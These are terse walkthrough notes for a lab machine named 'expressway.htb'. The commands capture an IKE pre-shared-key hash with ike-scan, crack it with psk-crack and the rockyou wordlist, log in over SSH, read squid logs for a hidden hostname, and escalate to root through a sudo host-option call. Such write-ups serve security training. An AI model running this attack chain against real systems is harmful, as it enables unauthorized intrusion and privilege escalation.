# Scanning the popular UDP ports 

nmap -sU -Pn -p 53,69,123,161,500,1900,4500 -v 10.10.11.87
500/udp  open|filtered          isakmp

# Isakmp is the IPsec Tunnel protocol 
## Scan and Search with ike-scan

```
ike-scan expressway.htb
ike-scan -A expressway.htb
ike-scan -A expressway.htb --id=ike@expressway.htb -P ike.psk
```

## Crack Ike hash with psk

psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk

## SSH 
ssh ike@expressway.htb

## In the it shows the Alias of expressway.htb - offramp.expressway.htb

ls -l /var/log/squid
cat /var/log/squid/access.log.1

## Finally Get Root

/usr/local/bin/sudo -h offramp.expressway.htb bash
